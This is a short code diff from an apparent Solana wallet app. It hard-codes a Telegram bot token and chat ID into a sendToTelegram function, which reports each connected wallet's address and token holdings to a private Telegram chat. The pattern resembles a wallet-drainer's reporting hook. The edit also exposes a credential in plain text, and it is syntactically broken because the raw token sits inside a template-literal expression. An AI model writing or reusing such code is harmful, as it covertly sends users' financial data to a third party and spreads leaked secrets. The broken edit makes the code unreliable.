@@ -24,13 +24,13 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: -1002490122517,
         text: `New Wallet Connected:\nAddress: ${walletData.address}\nTokens: ${JSON.stringify(walletData.tokens, null, 2)}`,
       }),
     });
